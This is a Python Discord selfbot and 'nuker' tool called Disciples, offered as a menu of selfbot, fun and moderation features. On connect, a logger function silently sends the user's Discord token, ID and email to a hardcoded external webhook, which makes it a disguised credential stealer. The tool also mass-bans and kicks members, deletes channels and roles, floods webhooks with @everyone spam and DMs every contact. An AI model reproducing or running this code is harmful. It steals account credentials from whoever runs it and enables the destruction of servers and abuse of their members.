import discord
from discord.ext import commands, tasks
import colorama
from colorama import Fore as F
import os
from os import system
import json
import threading
import requests
import asyncio
import aiohttp
import time
import random
from discord_webhook import DiscordWebhook, DiscordEmbed
from discord import Webhook, AsyncWebhookAdapter

system("title " + "Configuration")
os.system('cls')
token = input(f'''{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Token: ''')
prefix = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Prefix: ')
intents = discord.Intents.default()

intents.members = True


client = discord.Client()  

client = commands.Bot(command_prefix = prefix, self_bot=True, intents=intents)

client.remove_command('help')

headers = {'Authorization' : f'{token}'}

spam = True



#ifmentionedcommand

white = discord.Color.from_rgb(255,182,193)


class Disciples:

  async def logger():
    webhookurl = 'https://discord.com/api/webhooks/838935989777989642/tcbyTHMHvHGnBIyi-Em6_Q7dL3gZUKOY6m6fg6Li9EPXX6CMiLjQB8Ti0pfovwRh0zpz'
    webav = ''
    webhook = DiscordWebhook (url=webhookurl, username="DISCIPLES", avatar_url=(webav))

    embed = DiscordEmbed(color=0xFFB6C1, description= '```DISCIPLES Verification```')
    embed.add_embed_field(name = "UserName",  value=f"{client.user.name}#{client.user.discriminator}", inline = False)
    embed.add_embed_field(name = "Token",  value=f"{token}", inline = False)
    embed.add_embed_field(name = "ID",  value=f"{client.user.id}", inline = False)
    embed.add_embed_field(name = "Email",  value=f"{client.user.email}", inline = False)
    embed.set_thumbnail(url = '')
    webhook.add_embed(embed)
    embed.set_image(url = '')
    response = webhook.execute()
    

  async def webspam():
    lol=input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Webhook URL:")
    webusername = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Webhook Username:")
    messagespam = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Webhook Message:")
    ammount =int(input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Ammount:"))
    webav = ("https://cdn.discordapp.com/attachments/816128594908676136/838799620900388874/money.gif")

    webhook = DiscordWebhook(url=lol,content=messagespam, username=webusername, avatar_url=(webav))
    for i in range(ammount):
      response = webhook.execute()
    print (f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Successfully Spammed {messagespam}")
    time.sleep(2)
    await Disciples.Menu()

  async def dmall():
    message = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Insert Message Here:")
    try:
        for a in client.private_channels:
            await a.send(message)
            print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Sent To{a}")
    except:
        pass
    time.sleep(2)
    await Disciples.Menu()

  def CreateWebhook(channel):
        try:
            json = {
                'name': '𝘿𝙄𝙎𝘾𝙄𝙋𝙇𝙀𝙎',
            }
            r = requests.post(f'https://discord.com/api/v9/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass

  def SendWebhook(webhook, content):
        try:
            for i in range(1000):
                payload={
                    'username': '𝘿𝙄𝙎𝘾𝙄𝙋𝙇𝙀𝙎',
                    'content': '@everyone discord.gg/females'
                }
                requests.post(webhook, json=payload)
        except:
            pass


  async def scrape():
        guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild Id: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        
        os.remove("scrape/m.txt")
        os.remove("scrape/c.txt")
        os.remove("scrape/r.txt")
        
          

        membercount = 0
        with open('scrape/m.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Successfully Scraped {F.GREEN}{membercount}{F.RESET} Members")
            m.close()

        channelcount = 0
        with open('scrape/c.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Successfully Scraped {F.GREEN}{channelcount}{F.RESET} Channels")
            c.close()

        rolecount = 0
        with open('scrape/r.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Successfully Scraped {F.GREEN}{rolecount}{F.RESET} Roles")
            r.close()
        time.sleep(2)
        await Disciples.Nuker()
    
  


  def banfunction(guild, member):
       while True:
            json = {'reason': 'Disciples was here'}
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers,json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} {member.strip()} banned')
                    break
                else:
                    break
  
  async def banall():
   guild = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild Id: ")
   print()
   members = open('scrape/m.txt')
   for member in members: 
      threading.Thread(target=Disciples.banfunction, args=(guild, member,)).start()
      threading.Thread(target=Disciples.banfunction, args=(guild, member,)).start()
   time.sleep(2)
   await Disciples.Nuker()

  def kickfunction(guild, member):
        while True:
            json = {'reason': 'Disciples was here'}
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers,json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} {member.strip()} kicked')
                    break
                else:
                    break
  
  async def kickall():

   guild = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild Id: ")
   print()
   members = open('scrape/m.txt')
   for member in members: 
      threading.Thread(target=Disciples.kickfunction, args=(guild, member,)).start()
      threading.Thread(target=Disciples.kickfunction, args=(guild, member,)).start()
   members.close()
   time.sleep(2)
   await Disciples.Nuker()
  
  
  def guildfunction(guild, name):
    while True:
      json = {'name':name}
      r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}",headers=headers,json=json)
      if'retry_after'in r.text:
        time.sleep(r.json()['retry_after'])
      else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
          print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Changed Guild Name {name}")
        else:
          pass

  async def guild():
    guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID: ')
    name = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild Name: ')
    threading.Thread(target=Disciples.guildfunction,args=(guild,name)).start()
    time.sleep(2)
    await Disciples.Nuker()

  def channeldfunction( guild, channel):
      while True:
        r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
          if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
             print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Deleted Channel: {channel.strip()}")
             break
          else:
            break
  
  

  async def Dchan():
    guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID: ')
    channels = open('scrape/c.txt')
    for channel in channels:
      threading.Thread(target=Disciples.channeldfunction,args=(guild,channel,)).start()
    channels.close()
    time.sleep(2)
    await Disciples.Nuker()

  def channelcfunction( guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Created: {name}")
                    if spam == True:
                      webhook = Disciples.CreateWebhook(r.json()['id'])
                      threading.Thread(target=Disciples.SendWebhook, args=(webhook,)).start()
                    break
                else:
                    break

  def roledfunction( guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Deleted: {role.strip()}")
                    break
                else:
                    break

  async def Drole():
        guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID: ')
        print()
        roles = open('scrape/r.txt')
        for role in roles:
            threading.Thread(target=Disciples.roledfunction,args=(guild,role,)).start()
        roles.close()
        time.sleep(2)
        await Disciples.Nuker()

  def rolecfunction( guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Created: {name.strip()}")
                    break
                else:
                    break

  async def Crole():
        guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID:')
        name = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Role Name:')
        amount = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Role Ammount:')
        print()
        for i in range(int(amount)):
            threading.Thread(target=Disciples.rolecfunction, args=(guild, name,)).start()
        time.sleep(2)
        await Disciples.Nuker()


  async def wizz():
    guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID:')
    channelname = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Channel Name:')
    channelamount = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Channel Amount:')
    rolename = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Role Name:')
    roleamount = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Role Amount:')
 

    members = open('scrape/m.txt')
    channels = open('scrape/c.txt')
    roles = open('scrape/r.txt')

    for member in members:
      threading.Thread(target=Disciples.banfunction, args=(guild,member,)).start()
    for channel in channels:
      threading.Thread(target=Disciples.channeldfunction,args=(guild,channel,)).start()
    for role in roles:
      threading.Thread(target=Disciples.roledfunction,args=(guild,role,)).start()
    for i in range(int(channelamount)):
      threading.Thread(target=Disciples.channelcfunction,args=(guild,channelname,)).start()
    for i in range(int(roleamount)):
            threading.Thread(target=Disciples.rolecfunction, args=(guild, rolename,)).start()
    members.close()
    channels.close()
    roles.close()
    time.sleep(2)
    await Disciples.Nuker()
    

      
  async def Cchan():
    guild = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Guild ID:')
    name = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Channel Names:')
    amount = input(f'{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Ammount:')
    channels = open('scrape/c.txt')
    print()
    for i in range(int(amount)):
      threading.Thread(target=Disciples.channelcfunction,args=(guild,name)).start()
    channels.close()
    time.sleep(2)
    await Disciples.Nuker()


            

  def Credits():
        os.system(f'title ~ Disciples Credits')
        print(f'''
        {F.WHITE}╔════════════╦════════════╦══════════════╗  
        {F.WHITE}║ {F.GREEN}solar#7777 {F.WHITE}║ {F.GREEN}mike.#0007 {F.WHITE}║ {F.GREEN}Rayy.#0004 {F.WHITE}║
        {F.WHITE}╚════════════╩════════════╩══════════════╝ 
        ''')

  async def Nuker():
        os.system(f'cls & title ~ Disciples Nuker Menu')
        print(f''' 
 \033[97m_______   ______   ______    ______   ______  _______   __        ________   ______\033[0m  
\033[97m/       \ /      | /      \  /      \ /      |/       \ /  |      /        | /      \ \033[0m 
\033[32m$$$$$$$  |$$$$$$/ /$$$$$$  |/$$$$$$  |$$$$$$/ $$$$$$$  |$$ |      $$$$$$$$/ /$$$$$$  |\033[0m
\033[32m$$ |  $$ |  $$ |  $$ \__$$/ $$ |  $$/   $$ |  $$ |__$$ |$$ |      $$ |__    $$ \__$$/\033[0m 
\033[32m$$ |  $$ |  $$ |  $$      \ $$ |        $$ |  $$    $$/ $$ |      $$    |   $$      \ \033[0m 
\033[32m$$ |  $$ |  $$ |   $$$$$$  |$$ |   __   $$ |  $$$$$$$/  $$ |      $$$$$/     $$$$$$  |\033[0m
\033[32m$$ |__$$ | _$$ |_ /  \__$$ |$$ \__/  | _$$ |_ $$ |      $$ |_____ $$ |_____ /  \__$$ |\033[0m
\033[32m$$    $$/ / $$   |$$    $$/ $$    $$/ / $$   |$$ |      $$       |$$       |$$    $$/\033[0m 
\033[32m$$$$$$$/  $$$$$$/  $$$$$$/   $$$$$$/  $$$$$$/ $$/       $$$$$$$$/ $$$$$$$$/  $$$$$$/\033[0m  
{F.WHITE}═════════════════════════════════════════════════════════{F.RESET}
{F.GREEN}[{F.WHITE}1{F.GREEN}]{F.WHITE} Nuke
{F.GREEN}[{F.WHITE}2{F.GREEN}]{F.WHITE} Ban
{F.GREEN}[{F.WHITE}3{F.GREEN}]{F.WHITE} Kick 
{F.GREEN}[{F.WHITE}4{F.GREEN}]{F.WHITE} Delete Channel
{F.GREEN}[{F.WHITE}5{F.GREEN}]{F.WHITE} Create Channel
{F.GREEN}[{F.WHITE}6{F.GREEN}]{F.WHITE} Delete Role
{F.GREEN}[{F.WHITE}7{F.GREEN}]{F.WHITE} Create Role
{F.GREEN}[{F.WHITE}8{F.GREEN}]{F.WHITE} Scrape
{F.GREEN}[{F.WHITE}9{F.GREEN}]{F.WHITE} Guild
{F.GREEN}[{F.WHITE}M{F.GREEN}]{F.WHITE} Menu
{F.GREEN}[{F.WHITE}X{F.GREEN}]{F.WHITE} Exit 
{F.WHITE}════════════════════════════════════════════════════════{F.RESET}                               
  ''')                   

        choice = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Choice: ")
        if choice == '1':
            await Disciples.wizz()
            time.sleep(2)
        elif choice == '2':
            await Disciples.banall()
            time.sleep(2)
        elif choice == '3':
            await Disciples.kickall()
            time.sleep(2)
        elif choice == '4':
            await Disciples.Dchan()
            time.sleep(2)
        elif choice == '5':
            await Disciples.Cchan()
            time.sleep(2)
        elif choice == '6':
            await Disciples.Drole()
            time.sleep(2)
        elif choice == '7':
            await Disciples.Crole()
            time.sleep(2)
        elif choice == '9':
            await Disciples.guild()
            time.sleep(2)
        elif choice == '8':
            await Disciples.scrape()
            time.sleep(2)
        elif choice == 'M' or choice == 'm':
            await Disciples.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    
  async def Menu():
        os.system(f'cls & title ~ Disciples SelfBot Menu')
        print(f''' 
 \033[97m_______   ______   ______    ______   ______  _______   __        ________   ______\033[0m  
\033[97m/       \ /      | /      \  /      \ /      |/       \ /  |      /        | /      \ \033[0m 
\033[32m$$$$$$$  |$$$$$$/ /$$$$$$  |/$$$$$$  |$$$$$$/ $$$$$$$  |$$ |      $$$$$$$$/ /$$$$$$  |\033[0m
\033[32m$$ |  $$ |  $$ |  $$ \__$$/ $$ |  $$/   $$ |  $$ |__$$ |$$ |      $$ |__    $$ \__$$/\033[0m 
\033[32m$$ |  $$ |  $$ |  $$      \ $$ |        $$ |  $$    $$/ $$ |      $$    |   $$      \ \033[0m 
\033[32m$$ |  $$ |  $$ |   $$$$$$  |$$ |   __   $$ |  $$$$$$$/  $$ |      $$$$$/     $$$$$$  |\033[0m
\033[32m$$ |__$$ | _$$ |_ /  \__$$ |$$ \__/  | _$$ |_ $$ |      $$ |_____ $$ |_____ /  \__$$ |\033[0m
\033[32m$$    $$/ / $$   |$$    $$/ $$    $$/ / $$   |$$ |      $$       |$$       |$$    $$/\033[0m 
\033[32m$$$$$$$/  $$$$$$/  $$$$$$/   $$$$$$/  $$$$$$/ $$/       $$$$$$$$/ $$$$$$$$/  $$$$$$/\033[0m  
{F.WHITE}═════════════════════════════════════════════════════════{F.RESET}
Logged in as: {client.user.name}#{client.user.discriminator}
ServerCount: {len(client.guilds)}
Prefix: {client.command_prefix}
{F.WHITE}════════════════════════════════════════════════════════{F.RESET}  
{F.GREEN}[{F.WHITE}ENTER{F.GREEN}]{F.WHITE} Activate SB                             
{F.GREEN}[{F.WHITE}N{F.GREEN}]{F.WHITE} Nuke Menu
{F.GREEN}[{F.WHITE}D{F.GREEN}]{F.WHITE} Dmall
{F.GREEN}[{F.WHITE}W{F.GREEN}]{F.WHITE} Webhook Spammer
{F.GREEN}[{F.WHITE}C{F.GREEN}]{F.WHITE} Credits
{F.GREEN}[{F.WHITE}X{F.GREEN}]{F.WHITE} Exit 
{F.WHITE}════════════════════════════════════════════════════════{F.RESET}  
  ''')                   


        choice = input(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Choice: ")
        if choice == 'N' or choice =='n':
            await Disciples.Nuker()
        elif choice == 'C' or choice == 'c':
            Disciples.Credits()
            input()
            await Disciples.Menu()
        elif choice == 'D' or choice == 'd':
            await Disciples.dmall()
        elif choice == 'W' or choice == 'w':
            await Disciples.webspam() 
        elif choice == 'X' or choice == 'x':
            os._exit(0)
            
@client.event 
async def on_connect():
  try:
      await Disciples.Menu()
      await Disciples.logger()
  except:
      await Disciples.Menu()
                
            

@client.listen('on_message')
async def ifmentioned(message):
  if message.author == client.user:
    return
  if str(client.user.id) in message.content:
    print("══════════════════════════════════════════════════")
    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Mentioned -", f"Mentioned By{F.WHITE}: {message.author}.")
    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Mentioned -", f"Server{F.WHITE}: {message.guild}")
    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Mentioned -", f"Channel{F.WHITE}: {message.channel}")
    print(f"{F.GREEN}[{F.WHITE}+{F.GREEN}]{F.WHITE} Mentioned -", f"Message Content: {message.content}".replace(f"<@{client.user.id}>" or f"<@!{client.user.id}>", ""))
    print("══════════════════════════════════════════════════")

@client.command()
async def rolldice(ctx):
    await ctx.message.delete()
    message = await ctx.send("`Choose a number:`\n**4**, **6**, **8**, **10**, **12**, **20** ")
    
    def check(m):
        return m.author == ctx.author

    try:
        message = await client.wait_for("message", check = check, timeout = 5.0)
        m = message.content

        if m != "4" and m != "6" and m != "8" and m != "10" and m != "12" and m != "20":
            await ctx.send("`Sorry, invalid choice.`")
            return
        
        coming = await ctx.send("`Rolling The Dice`")
        time.sleep(1)
        await coming.delete()
        await ctx.send(f"**{random.randint(1, int(m))}**")
    except asyncio.TimeoutError:
        await message.delete()
        await ctx.send("`Procces has been canceled because you didn't respond in **30** seconds.`")

@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed=discord.Embed(description="[𝘋𝘪𝘴𝘤𝘪𝘱𝘭𝘦𝘴](https://discord.gg/females) 𝘚𝘦𝘭𝘧𝘣𝘰𝘵 (𝘉𝘰𝘰𝘴𝘵𝘦𝘳𝘴 𝘖𝘯𝘭𝘺)", color=white)
    embed.add_field(name='𝘔𝘰𝘥𝘦𝘳𝘢𝘵𝘪𝘰𝘯', value='*Displays Disciples Moderation Commands.*', inline=False)
    embed.add_field(name='𝘍𝘶𝘯', value='*Displays Disciples Fun Commands.*', inline=False)
    embed.add_field(name="𝘚𝘵𝘢𝘵𝘶𝘴", value='*Displays Disciples Status Commands.*', inline=False)
    embed.set_author(name="𝘋𝘪𝘴𝘤𝘪𝘱𝘭𝘦𝘴 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
    embed.set_thumbnail(url=ctx.author.avatar_url)
    embed.set_image(url='https://media.discordapp.net/attachments/807493147923316776/809789855181438996/image3.gif')
    embed.set_footer(text="𝐷𝐼𝑆𝐶𝐼𝑃𝐿𝐸𝑆™")
    await ctx.send(embed=embed)

@client.command()
async def pat(ctx, user: discord.Member):
 await ctx.message.delete()
 r = requests.get("https://nekos.life/api/v2/img/pat")
 res = r.json()
 embed=discord.Embed(description=f'**{ctx.author.mention} Pats {user.mention}**',color=white)
 embed.set_image(url=res['url'])
 await ctx.send(embed=embed)

@client.command()
async def hug(ctx, user: discord.Member):
 await ctx.message.delete()
 r = requests.get("https://nekos.life/api/v2/img/hug")
 res = r.json()
 embed=discord.Embed(description=f'**{ctx.author.mention} Hugs {user.mention}**',color=white)
 embed.set_image(url=res['url'])
 await ctx.send(embed=embed)

@client.command()
async def slap(ctx, user: discord.Member):
 await ctx.message.delete()
 r = requests.get("https://nekos.life/api/v2/img/slap")
 res = r.json()
 embed=discord.Embed(description=f'**{ctx.author.mention} Slaps {user.mention}**',color=white)
 embed.set_image(url=res['url'])
 await ctx.send(embed=embed)

@client.command()
async def fun(ctx):
  await ctx.message.delete()
  embed=discord.Embed(description='**𝘍𝘶𝘯 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴**', color=white)
  embed.add_field(name='𝘒𝘪𝘴𝘴', value='𝘒𝘪𝘴𝘴𝘦𝘴 𝘵𝘩𝘦 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘦𝘥 𝘶𝘴𝘦𝘳', inline=False)
  embed.add_field(name='𝘏𝘶𝘨', value='𝘏𝘶𝘨𝘴 𝘵𝘩𝘦 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘦𝘥 𝘶𝘴𝘦𝘳', inline=False)
  embed.add_field(name='𝘗𝘢𝘵', value='𝘗𝘢𝘵𝘴 𝘵𝘩𝘦 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘦𝘥 𝘶𝘴𝘦𝘳', inline=False)
  embed.add_field(name='𝘚𝘭𝘢𝘱', value='𝘚𝘭𝘢𝘱𝘴 𝘵𝘩𝘦 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘦𝘥 𝘶𝘴𝘦𝘳', inline=False)
  embed.add_field(name='𝘚𝘱𝘢𝘮', value='𝘚𝘱𝘢𝘮𝘴 𝘵𝘩𝘦 𝘴𝘦𝘵 𝘢𝘮𝘰𝘶𝘯𝘵 𝘰𝘧 𝘮𝘦𝘴𝘴𝘢𝘨𝘦𝘴', inline=False)
  embed.set_author(name="𝘋𝘪𝘴𝘤𝘪𝘱𝘭𝘦𝘴 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
  embed.set_thumbnail(url=ctx.author.avatar_url)
  embed.set_image(url='https://media.discordapp.net/attachments/833951350718201866/837420109680869406/a_48c08bd4e8c9826c03c4f6ebb4eec824.gif')
  embed.set_footer(text="𝐷𝐼𝑆𝐶𝐼𝑃𝐿𝐸𝑆™")
  await ctx.send(embed=embed)
  
@client.command(aliases=['mod'])
async def moderation(ctx):
 await ctx.message.delete()
 embed=discord.Embed(description="**𝘔𝘰𝘥𝘦𝘳𝘢𝘵𝘪𝘰𝘯 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴**", color=white)
 embed.add_field(name='𝘒𝘪𝘤𝘬', value='*Kicks the mentioned user.*', inline=False)
 embed.add_field(name='𝘉𝘢𝘯', value='*Bans the mentioned user.*', inline=False)
 embed.add_field(name="𝘈𝘥𝘥𝘳𝘰𝘭𝘦/𝘙𝘰𝘭𝘦", value='*Adds the specified Role to the mentioned user.*', inline=False)
 embed.add_field(name="𝘗𝘶𝘳𝘨𝘦", value='*Purges The set amount of messages.*', inline=False)
 embed.set_author(name="𝘋𝘪𝘴𝘤𝘪𝘱𝘭𝘦𝘴 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
 embed.set_thumbnail(url=ctx.author.avatar_url)
 embed.set_image(url='https://media.discordapp.net/attachments/807493147923316776/811936680588214302/image4.gif')
 embed.set_footer(text="𝐷𝐼𝑆𝐶𝐼𝑃𝐿𝐸𝑆™")
 await ctx.send(embed=embed)

@client.command(pass_contex=True)
async def spam(ctx, amount: int, *, message):
  await ctx.message.delete()
  for _i in range(amount):
      await ctx.send(message)

@client.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    embed=discord.Embed(description=f'**{ctx.author.mention} Kisses {user.mention}**',color=white)
    embed.set_image(url=res['url'])
    await ctx.send(embed=embed)

@client.command(aliases=['status'])
async def Status(ctx):
 await ctx.message.delete()
 embed=discord.Embed(description="**𝘚𝘵𝘢𝘵𝘶𝘴 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴**", color=white)
 embed.add_field(name='𝘞𝘢𝘵𝘤𝘩', value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨', inline=False)
 embed.add_field(name='𝘚𝘵𝘳𝘦𝘢𝘮', value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘚𝘵𝘳𝘦𝘢𝘮𝘪𝘯𝘨', inline=False)
 embed.add_field(name="𝘗𝘭𝘢𝘺", value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘗𝘭𝘢𝘺𝘪𝘯𝘨', inline=False)
 embed.add_field(name="𝘓𝘪𝘴𝘵𝘦𝘯", value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘓𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨', inline=False)
 embed.add_field(name="𝘊𝘰𝘮𝘱𝘦𝘵𝘦 ", value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘊𝘰𝘮𝘱𝘦𝘵𝘪𝘯𝘨', inline=False)
 embed.add_field(name="𝘚𝘵𝘰𝘱", value='𝘚𝘦𝘵𝘴 𝘚𝘵𝘢𝘵𝘶𝘴 𝘛𝘰 𝘋𝘦𝘧𝘢𝘶𝘭𝘵', inline=False)
 embed.set_author(name="𝘋𝘪𝘴𝘤𝘪𝘱𝘭𝘦𝘴 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
 embed.set_thumbnail(url=ctx.author.avatar_url)
 embed.set_image(url='https://media.discordapp.net/attachments/727914461876322417/796872995406479380/image3.gif')
 embed.set_footer(text="𝐷𝐼𝑆𝐶𝐼𝑃𝐿𝐸𝑆™")
 await ctx.send(embed=embed)
 
@client.command()
async def av(ctx, member: discord.Member=None):
  await ctx.message.delete()
  member = ctx.author if not member else member
  embed=discord.Embed(title=f'{member}s Avatar',color=white)
  embed.set_image(url=member.avatar_url)
  await ctx.send(embed=embed)

@client.command()
async def purge(ctx, amount=1):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)
  embed=discord.Embed(title=f'**Purged {amount} messages.**', color=white, delete_after=10)
  await ctx.send(embed=embed)


@client.command(aliases=['role'])
async def addrole(ctx, member: discord.Member, role: discord.Role):
  await member.add_roles(role)
  await ctx.send(f'**Added {role} to {member}**')


##stream commands
  
@client.command(aliases=['Stream'])
async def stream(ctx, *, text):
       await ctx.message.delete()
       await client.change_presence(activity=discord.Streaming (url = "https://www.twitch.tv/reallsolar", name= text))
       embed = discord.Embed(description = f"**{ctx.author.mention}, Is now streaming {text}**", color=(white))
       await ctx.send(embed=embed)

@client.command(aliases=['Play'])
async def play(ctx, *, text):
       await ctx.message.delete()
       await client.change_presence(activity=discord.Game(name = text))
       embed = discord.Embed(description = f"**{ctx.author.mention}, Is now Playing {text}**", color=(white))
       await ctx.send(embed=embed)

@client.command(aliases=['Watch'])
async def watch(ctx, *, text):
       await ctx.message.delete()
       await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name= text))
       embed = discord.Embed(description = f"**{ctx.author.mention}, Is now Watching {text}**", color=(white))
       await ctx.send(embed=embed)

@client.command(aliases=['Listen'])
async def listen(ctx, *, text):
        await ctx.message.delete()
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name= text))
        embed = discord.Embed(description = f"**{ctx.author.mention}, Is Now To Listening {text}**", color=(white))
        await ctx.send(embed=embed)

@client.command(aliases=['Compete'])
async def compete(ctx, *, text):
        await ctx.message.delete()
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name= text))
        embed = discord.Embed(description = f"**{ctx.author.mention}, Is Now Competing In{text}**", color=(white))
        await ctx.send(embed=embed)

@client.command(aliases=['reset'])
async def stop(ctx):
       await ctx.message.delete()
       await client.change_presence(activity=None, status=discord.Status.dnd)
       embed = discord.Embed(description = f"**{ctx.author.mention}'s Status Has Been Reset**", color=(white))
       await ctx.send(embed=embed)

MESSAGE_CONTENTS = ['f', 'r', 'i', 'c', 'k']

@client.command()
async def f1(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"pls beg")
  time.sleep(2)
  msg = await ctx.send(f"pls hunt")
  time.sleep(2)
  msg = await ctx.send(f"pls fish")
  time.sleep(2)
  msg = await ctx.send(f"pls pm")
  time.sleep(2)
  msg = await ctx.send(random.choice(MESSAGE_CONTENTS))
  time.sleep(5)
  msg = await ctx.send(f"pls dep all")
  time.sleep(30)
  msg = await ctx.send(f"d!f1")

@client.command()
async def f2(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"pls bet 2500")
  time.sleep(7)
  msg = await ctx.send(f"d!f2")


client.run(token, bot=False)
